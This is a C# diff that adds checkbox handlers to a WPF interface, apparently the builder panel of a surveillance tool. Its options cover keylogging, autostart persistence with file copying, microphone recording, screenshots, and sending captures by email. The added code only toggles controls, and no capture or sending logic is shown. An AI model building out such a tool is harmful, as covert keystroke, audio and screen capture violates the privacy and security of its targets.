@@ -245,5 +245,69 @@ namespace DNAV_GUI
         {
             keyloggerLocalCombobox.IsEnabled = false;
         }
+
+        private void autostartCheckbox_Checked(object sender, RoutedEventArgs e)
+        {
+            autostartCopyCheckbox.IsEnabled = true;
+        }
+
+        private void autostartCheckbox_Unchecked(object sender, RoutedEventArgs e)
+        {
+            autostartCopyCheckbox.IsEnabled = false;
+        }
+
+        private void autostartCopyCheckbox_Checked(object sender, RoutedEventArgs e)
+        {
+            autostartCopyCombobox.IsEnabled = true;
+        }
+
+        private void autostartCopyCheckbox_Unchecked(object sender, RoutedEventArgs e)
+        {
+            autostartCopyCombobox.IsEnabled = false;
+        }
+
+        private void microphoneCheckbox_Checked(object sender, RoutedEventArgs e)
+        {
+            microphoneLocalCheckbox.IsEnabled = true;
+            microphoneEmailCheckbox.IsEnabled = true;
+        }
+
+        private void microphoneCheckbox_Unchecked(object sender, RoutedEventArgs e)
+        {
+            microphoneLocalCheckbox.IsEnabled = false;
+            microphoneEmailCheckbox.IsEnabled = false;
+        }
+
+        private void microphoneLocalCheckbox_Checked(object sender, RoutedEventArgs e)
+        {
+            microphoneLocalCombobox.IsEnabled = true;
+        }
+
+        private void microphoneLocalCheckbox_Unchecked(object sender, RoutedEventArgs e)
+        {
+            microphoneLocalCombobox.IsEnabled = false;
+        }
+
+        private void screenshotCheckbox_Checked(object sender, RoutedEventArgs e)
+        {
+            screenshotLocalCheckbox.IsEnabled = true;
+            screenshotEmailCheckbox.IsEnabled = true;
+        }
+
+        private void screenshotCheckbox_Unchecked(object sender, RoutedEventArgs e)
+        {
+            screenshotLocalCheckbox.IsEnabled = false;
+            screenshotEmailCheckbox.IsEnabled = false;
+        }
+
+        private void screenshotLocalCheckbox_Checked(object sender, RoutedEventArgs e)
+        {
+            screenshotLocalCombobox.IsEnabled = true;
+        }
+
+        private void screenshotLocalCheckbox_Unchecked(object sender, RoutedEventArgs e)
+        {
+            screenshotLocalCombobox.IsEnabled = false;
+        }
     }
 }
